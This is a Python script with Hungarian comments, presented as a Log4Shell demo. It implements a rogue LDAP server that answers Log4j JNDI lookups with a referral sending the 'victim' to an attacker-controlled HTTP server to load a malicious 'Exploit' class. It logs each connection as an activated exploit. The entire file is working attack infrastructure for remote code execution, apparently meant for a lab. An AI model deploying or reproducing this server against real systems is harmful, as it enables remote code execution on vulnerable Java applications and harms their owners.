#!/usr/bin/env python3
"""
Log4Shell démó – Minimális LDAP szerver
Fogadja a Log4j JNDI lookup kéréseit, és visszairányítja
az áldozatot a HTTP szerverre a malicious class letöltéséhez.
"""

import socket
import struct
import threading
import logging
import os

logging.basicConfig(
    level=logging.INFO,
    format='[LDAP-SERVER] %(asctime)s %(levelname)s: %(message)s'
)
log = logging.getLogger(__name__)

ATTACKER_IP   = os.environ.get("ATTACKER_IP", "172.20.0.10")
LDAP_PORT     = 1389
HTTP_PORT     = 8888
CLASS_NAME    = "Exploit"

def build_ldap_referral_response(message_id: int, ldap_dn: str) -> bytes:
    """
    Épít egy LDAP SearchResultEntry választ, amely JNDI referral-t tartalmaz,
    a HTTP szerverre mutatva (ahonnan az Exploit.class letölthető).
    """
    referral_url = f"http://{ATTACKER_IP}:{HTTP_PORT}/#{CLASS_NAME}"
    log.info(f"Referral URL küldése: {referral_url}")

    ref_url_bytes = referral_url.encode()

    # LDAP SearchResultEntry (simplified, enough for Java JNDI)
    # Tag 0x64 = SearchResultEntry
    attrs_seq = b'\x30\x00'   # empty attributes sequence

    dn_bytes = ldap_dn.encode() if ldap_dn else b'dc=exploit,dc=local'
    dn_len   = len(dn_bytes)
    entry_content = (
        bytes([0x04, dn_len]) + dn_bytes +
        attrs_seq
    )

    entry_msg = bytes([0x64, len(entry_content)]) + entry_content

    # SearchResultDone with referral (result code 10 = referral)
    referral_tag = bytes([0xa3, len(ref_url_bytes) + 2]) + bytes([0x04, len(ref_url_bytes)]) + ref_url_bytes
    done_content = (
        b'\x0a\x01\x0a'          # result code 10 (referral)
        b'\x04\x00'              # matched DN empty
        b'\x04\x00'              # diagnostic message empty
    ) + referral_tag

    done_msg = bytes([0x65, len(done_content)]) + done_content

    # Wrap into LDAPMessage with sequence
    def wrap_msg(mid, payload):
        mid_enc = bytes([0x02, 0x01, mid & 0xff])
        inner   = mid_enc + payload
        return bytes([0x30, len(inner)]) + inner

    return wrap_msg(message_id, entry_msg) + wrap_msg(message_id + 1, done_msg)


def handle_client(conn: socket.socket, addr):
    log.info(f"Kapcsolat: {addr}")
    try:
        data = conn.recv(4096)
        if not data:
            return

        log.info(f"Fogadott LDAP kérés ({len(data)} byte): {data.hex()[:80]}...")

        # Parse message_id from LDAP envelope (byte 6 or 8 depending on length encoding)
        try:
            # Simple parse: look for 0x02 0x01 <id>
            idx = data.find(b'\x02\x01')
            message_id = data[idx + 2] if idx >= 0 else 1
        except Exception:
            message_id = 1

        # Try to extract the DN/search query
        try:
            dn_start = data.find(b'\x04') + 2
            dn_len   = data[dn_start - 1]
            ldap_dn  = data[dn_start: dn_start + dn_len].decode(errors='replace')
        except Exception:
            ldap_dn  = "cn=exploit"

        log.info(f"JNDI lookup érkezett! DN: {ldap_dn} | message_id: {message_id}")
        log.info(f"*** LOG4SHELL EXPLOIT AKTIVÁLVA! Áldozat: {addr[0]} ***")

        response = build_ldap_referral_response(message_id, ldap_dn)
        conn.sendall(response)
        log.info(f"Referral válasz elküldve → {ATTACKER_IP}:{HTTP_PORT}/#{CLASS_NAME}")

    except Exception as e:
        log.error(f"Hiba: {e}")
    finally:
        conn.close()


def main():
    log.info(f"LDAP szerver indul: 0.0.0.0:{LDAP_PORT}")
    log.info(f"Referral cél: http://{ATTACKER_IP}:{HTTP_PORT}/#{CLASS_NAME}")

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind(("0.0.0.0", LDAP_PORT))
    server.listen(10)
    log.info("Várakozás JNDI lookup kérésekre...")

    while True:
        try:
            conn, addr = server.accept()
            t = threading.Thread(target=handle_client, args=(conn, addr), daemon=True)
            t.start()
        except KeyboardInterrupt:
            break

    server.close()


if __name__ == "__main__":
    main()
